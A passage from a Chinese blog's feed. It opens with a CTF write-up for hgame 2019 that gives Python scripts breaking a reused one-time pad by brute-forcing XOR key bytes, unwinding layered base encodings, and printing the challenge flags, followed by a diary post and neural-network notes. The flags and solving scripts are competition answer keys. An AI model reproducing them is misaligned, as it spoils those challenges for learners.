class="number">0</span>] ^ key) <span class="keyword">for</span> t <span class="keyword">in</span> s]</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> answer <span class="keyword">in</span> answers:</span><br><span class="line">        f = f &amp; ((<span class="string">'a'</span> &lt;= answer &lt;= <span class="string">'z'</span>) | (<span class="string">'A'</span> &lt;= answer &lt;= <span class="string">'Z'</span>) | (answer == <span class="string">' '</span>))</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        print(key)</span><br></pre></td></tr></table></figure><p>但是一运行，结果却让我有点懵逼：</p><blockquote><p>136<br />137<br />138<br />139<br />141<br />142<br />143<br />148<br />149<br />150<br />168<br />169<br />170<br />171<br />173<br />174<br />175<br />180<br />181<br />182</p></blockquote><p>只是第一个就有这么多种？那后面会有多少种啊。。。</p><p>但是呢，我感觉我的思路应该是对的，所以干脆把后面的都先弄出来。</p><p>结果后面的值都是唯一的，所以我就直接输出flag的值了</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">s = [<span class="string">'daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54'</span>,</span><br><span class="line">     <span class="string">'c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb'</span>,</span><br><span class="line">     <span class="string">'dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e'</span>,</span><br><span class="line">     <span class="string">'d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154'</span>,</span><br><span class="line">     <span class="string">'d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a'</span>,</span><br><span class="line">     <span class="string">'c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34'</span>,</span><br><span class="line">     <span class="string">'d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090'</span>,</span><br><span class="line">     <span class="string">'c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090'</span>,</span><br><span class="line">     <span class="string">'d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f'</span>,</span><br><span class="line">     <span class="string">'cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87'</span>,</span><br><span class="line">     <span class="string">'d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244'</span>,</span><br><span class="line">     <span class="string">'e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199'</span>,</span><br><span class="line">     <span class="string">'c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c'</span>,</span><br><span class="line">     <span class="string">'d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397'</span>,</span><br><span class="line">     <span class="string">'c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840'</span>,</span><br><span class="line">     <span class="string">'c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c'</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        answers = [chr(binascii.unhexlify(t[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>])[<span class="number">0</span>] ^ key) <span class="keyword">for</span> t <span class="keyword">in</span> s]</span><br><span class="line">        f = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> answer <span class="keyword">in</span> answers:</span><br><span class="line">            f = f &amp; ((<span class="string">'a'</span> &lt;= answer &lt;= <span class="string">'z'</span>) | (<span class="string">'A'</span> &lt;= answer &lt;= <span class="string">'Z'</span>) | (answer == <span class="string">' '</span>))</span><br><span class="line">        <span class="keyword">if</span> f:</span><br><span class="line">            print(chr(binascii.unhexlify(flag[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>])[<span class="number">0</span>] ^ key), end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure><p>最后运行得到</p><blockquote><p>JKHIOLMVWTjkhiolmvwtTP_is_not_safe_if_more_than_once</p></blockquote><p>前面的<code>JKHIOLMVWTjkhiolmvwt</code>就是来自第一个的，后面的<code>TP_is_not_safe_if_more_than_once</code>很明显就是flag的一部分了。</p><p>那么很显然，第一个字母就是O，然后得到flag：</p><p><code>hgame{OTP_is_not_safe_if_more_than_once}</code></p><h3 id="3-base全家"><a class="markdownIt-Anchor" href="#3-base全家"></a> 3. Base全家</h3><h4 id="question-15"><a class="markdownIt-Anchor" href="#question-15"></a> Question</h4><p>Description</p><p>全家老小</p><p>URL</p><p><a href="http://plir4axuz.bkt.clouddn.com/hgame2019/enc.txt" target="_blank" rel="noopener">http://plir4axuz.bkt.clouddn.com/hgame2019/enc.txt</a></p><p>Base Score</p><p>50</p><h4 id="answer-16"><a class="markdownIt-Anchor" href="#answer-16"></a> Answer</h4><p>既然说了是base全家，那么就是base16,base32,base64全上呗。</p><p>用Python写了个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64</span><span class="params">(t)</span>:</span> <span class="keyword">return</span> base64.b64decode(t)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b32</span><span class="params">(t)</span>:</span> <span class="keyword">return</span> base64.b32decode(t)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b16</span><span class="params">(t)</span>:</span> <span class="keyword">return</span> base64.b16decode(t)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = open(<span class="string">"enc.txt"</span>, <span class="string">"rb"</span>)</span><br><span class="line">text = file.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = b16(text)</span><br><span class="line">        print(text)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text = b32(text)</span><br><span class="line">            print(text)</span><br><span class="line">        <span class="keyword">except</span> binascii.Error:</span><br><span class="line">            text = b64(text)</span><br><span class="line">            print(text)</span><br></pre></td></tr></table></figure><p>运行一波，最后虽然报错了，但是在输出里面发现了一行</p><p><code>b'base58 : 2BAja2VqXoHi9Lo5kfQZBPjq1EmZHGEudM5JyDPREPmS3CxrpB8BnC'</code></p><p>base58解码之后就是<code>hgame{40ca78cde14458da697066eb4cc7daf6}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;i-web&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#i-web&quot;&gt;&lt;/a&gt; Ⅰ WEB&lt;/h2&gt;
&lt;h3 id=&quot;1-谁吃了我的flag&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-谁吃了我的fl
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.rainbowyang.moe/categories/CTF/"/>
    
    
      <category term="WriteUp" scheme="https://blog.rainbowyang.moe/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>随谈·回顾</title>
    <link href="https://blog.rainbowyang.moe/post/Daily/Daily-Talk-2.html"/>
    <id>https://blog.rainbowyang.moe/post/Daily/Daily-Talk-2.html</id>
    <published>2018-12-30T03:48:40.000Z</published>
    <updated>2019-07-02T06:55:32.944Z</updated>
    
    <content type="html"><![CDATA[<p>又是许久未写博文了。</p><p>虽说一直有陆陆续续地小幅度修改博客的样子，但是一直不知道要写些什么。</p><p>这次我便想来回顾一下这将近半年。今年暑假，我终于从高中的囚笼中逃脱出来，说实话，高考发挥并不理想，去了一个自己曾不太想到的学校里。也有些高中同学，决定回去读高四。我曾想过回去复读，但最终我还是放弃了这个想法。我觉得我可能就不太适合考试这种东西，在正儿八经地要考试的时候，我总容易手慌脚乱，失去对大脑的控制。可能我没有选择复读，可以说是一种逃避，逃避我内心对考试的害怕，以及我内心所鄙夷的一种为了应试而学习的目的。</p><p>但是当我选择不再徘徊在高中的时候，我又似乎进入了另一种噩梦般的状态。我失去了我的目标，开始迷茫。在我初中的时候，我选择忙里偷闲地去学习编程，但是在平时还是有个大体的目标，也就是考上一个好一点的高中；在我高中的时候，也还是有这样的一个众人普遍的目标——考大学。那时，尽管很多时间都被应试学习所挤占，但是我忙里偷闲学的东西似乎也还是有的，感觉时间还是能硬生生挤出来来干一些事情的。但是在今年高考完的暑假里，看上去我有了许多的时间，包括博文也有好几篇，但是很多时间都是在浪费和无聊之中度过的。</p><p>许多时候，我不知道自己该做些什么。一边我有着许许多多的时间，令我感到十分地无聊和空闲；另一面我有很多可以学的东西，但是我却又已经反而难以静下心来去学习。或许是我放纵自己在心理舒适区待得过于舒适了，也或许是想着刚考完高考的暑假，就当作自己放松一下，等到入学了之后再去认真学习。说实话，我感觉我的暑假过的挺失败的，既没有找到我的目标，不知道自己要干嘛，也进一步消磨了我前进的动力。</p><p>按照我在初中开始的对编程的兴趣，我本想着我就是会选择一个与计算机有关的专业吧。但是在高中我又开始对物理产生了一些兴趣（在初中，我都没有明确地形成物理这个概念，因为理化生是混在一起的），所以我在选择去HDU之后，填志愿的时候，我在选择EE还是CS之间也犹豫了很久。</p><p>照我之前拿到的数据，HDU的EE无疑更厉害。但是大势所趋，CS的分数线毫无疑问地会比EE更高。在选专业之前，我都并不知道有EE这种东西，但是在我大概地查过资料之后，我的感觉就是EE较CS而言，更偏向于硬件的底层。最终我在明知CS分数高的情况下，在填报的志愿里，还是把EE放在了CS的前面，我也不知为什么。最终的结果，也很是有趣，我的分数不及CS，少了两分。所以，就理所当然地进了EE。</p><p>这样的结果就是我也不知道怎么和我奶奶解释我的专业到底是干嘛的，也说明了其实我有些稀里糊涂地就进了这个专业。</p><p>和我的几个同学比，感觉HDU开学算是比较晚的了，毕竟都快接近九月中旬了。在军训期间，说实话，每天也都还是比较累的，在寝室也睡的特别及时，所以基本上也没有什么学东西的时间了。等到军训完，便已经是国庆了。国庆之后也算是正式开始上课了。</p><p>一个星期有课的时间，满打满算其实也就只有三天半。也就是意味着我在一个星期之内有着超过一半的时间是基本上可以算是完全自由的。但是呢，说实话，我基本都没有好好地利用起来，以至于我，在这个学期即将结束的时候，都不知道这个学期我到底学了什么。对于老师布置的任务，完成得也近似于敷衍；对于一些两千字的大作业，我基本上都是没什么用心在里面。我也不知道为什么平时的时间到底应该用来做什么，我甚至开始不知道应该学什么了，还是根本就没有静下心去学那些的毅力。</p><p>第一个学期的几近自由的大学生活，让我感觉一点都不好，自由得让我感觉我仿佛只是在这里虚度时光，痛苦地品尝无味的岁月静好。我曾所渴望的自由生活，仿佛已经彻底被懒惰和欲望所挟持。这是真正的自由么，还是被自由奴役？</p><p>正如自由地选择在飘雪的冬天继续缩在温暖的被窝里一样，你也可以在去往前方的路上自由地选择继续呆在那个舒适的囚笼里，而止步不前。</p><p>当我有了选择被欲望囚禁的自由，我会继续选择自由，还是‘自由’呢？</p><hr /><p>写于飘雪杭城</p><p>二零一八年十二月三十日下午</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;又是许久未写博文了。&lt;/p&gt;
&lt;p&gt;虽说一直有陆陆续续地小幅度修改博客的样子，但是一直不知道要写些什么。&lt;/p&gt;
&lt;p&gt;这次我便想来回顾一下这将近半年。今年暑假，我终于从高中的囚笼中逃脱出来，说实话，高考发挥并不理想，去了一个自己曾不太想到的学校里。也有些高中同学，决定回去
      
    
    </summary>
    
    
      <category term="Daily" scheme="https://blog.rainbowyang.moe/categories/Daily/"/>
    
    
      <category term="日常" scheme="https://blog.rainbowyang.moe/tags/%E6%97%A5%E5%B8%B8/"/>
    
      <category term="思考" scheme="https://blog.rainbowyang.moe/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>神经网络和深度学习笔记</title>
    <link href="https://blog.rainbowyang.moe/post/Note-of-Deep-Leaning.html"/>
    <id>https://blog.rainbowyang.moe/post/Note-of-Deep-Leaning.html</id>
    <published>2018-08-20T14:03:08.000Z</published>
    <updated>2020-07-14T06:27:44.069Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>这篇博文也算不上什么入门教程，单纯只是记录一下看了<a href="http://www.3blue1brown.com/" target="_blank" rel="noopener">3blue1brown</a>的深度学习后的认识和想法。</p><h2 id="对神经网络的感觉"><a class="markdownIt-Anchor" href="#对神经网络的感觉"></a> 对神经网络的感觉</h2><p>我觉得这像是形异但神似的仿生学。</p><p>从数不尽的神经元以及神奇而又错综复杂的神经连结的底层，到会哭会笑的自我感知以及充满无穷无尽的创意智慧的顶层，人类对于自己的大脑如何从神经到产生自我意识以及智慧的认识，依然有着断层。尽管对于大脑的研究不断深入，但是这一步，却是始终无法踏出。</p><p>所以不再去考虑外形，而是利用强大的算力模拟神经的连结和运转，来期望能够产生智能。</p><h2 id="神经网络的结构"><a class="markdownIt-Anchor" href="#神经网络的结构"></a> 神经网络的结构</h2><h3 id="神经元"><a class="markdownIt-Anchor" href="#神经元"></a> 神经元</h3><p>神经网络的最基本的单元便是神经元。但在计算机里的神经元更像是一个函数：它有输入，有输出。但是都是数值，模拟神经兴奋的强度。</p><p>然后许多的神经元会组成一层，并且会有很多层。上一层的每个神经元都会把自己的信号输送到下一层的每个神经元。也就是说如果设第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span>层有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>N</mi><mi>L</mi></msub></mrow><annotation encoding="application/x-tex">N_L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">L</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>个神经元，第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">L+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">L</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>层有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>N</mi><mrow><mi>L</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">N_{L+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">L</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>个神经元，那么这两层之间的连结数就会多达<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>N</mi><mi>L</mi></msub><msub><mi>N</mi><mrow><mi>L</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">N_LN_{L+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">L</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">L</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>.</p><h3 id="神经连结以及处理"><a class="markdownIt-Anchor" href="#神经连结以及处理"></a> 神经连结以及处理</h3><p>但是神经元之间的连结也会有强有弱，所以对来自上一层每一个神经元的输入都会乘上一个单独权重<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span></span></span></span>(eight)，然后加和。</p><p>最后每个神经元自己还有一个决定自己是否容易被激活的阈值，所以需要加上一个偏置<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>(ias)，最后得到一个值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span>(um)，也就是这个神经元的对下一层的输出。</p><p>但是呢，还会有另外一些手段，对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span>进行进一步处理，然后再输出。</p><p>一个比较简单但是不知道为什么的例子就是<a href="https://zh.wikipedia.org/wiki/%E7%BA%BF%E6%80%A7%E6%95%B4%E6%B5%81%E5%87%BD%E6%95%B0" target="_blank" rel="noopener">线性整流函数（Rectified Linear Unit, ReLU）</a>,里面最简单的就是</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">f(x)=max(0,x).</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mord">.</span></span></span></span></span></p><p>还有一个就是<a href="https://zh.wikipedia.org/wiki/%E9%82%8F%E8%BC%AF%E5%87%BD%E6%95%B8" target="_blank" rel="noopener">逻辑函数</a></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>σ</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo>+</mo><msup><mi>e</mi><mrow><mo>−</mo><mi>x</mi></mrow></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">f(x)=\sigma(x)=(1+e^{-x})^{-1}.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.821331em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord">.</span></span></span></span></span></p><h3 id="符号设定"><a class="markdownIt-Anchor" href="#符号设定"></a> 符号设定</h3><p>对于第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span>层的第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>个神经元而言，其输出定为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>a</mi><mi>i</mi><mrow><mo stretchy="false">(</mo><mi>L</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">a_i^{(L)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.321664em;vertical-align:-0.27686399999999994em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">L</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.27686399999999994em;"><span></span></span></span></span></span></span></span></span></span>，其偏置定位为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>B</mi><mi>i</mi><mrow><mo stretchy="false">(</mo><mi>L</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">B_i^{(L)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.321664em;vertical-align:-0.27686399999999994em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231360000000004em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">L</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.27686399999999994em;"><span></span></span></span></span></span></span></span></span></span>，其对于前一层的第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>个神经元的神经连结的权重为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>W</mi><mrow><mi>j</mi><mo>−</mo><mi>k</mi></mrow><mrow><mo stretchy="false">(</mo><mi>L</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">W_{j-k}^{(L)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4822159999999998em;vertical-align:-0.4374159999999999em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span 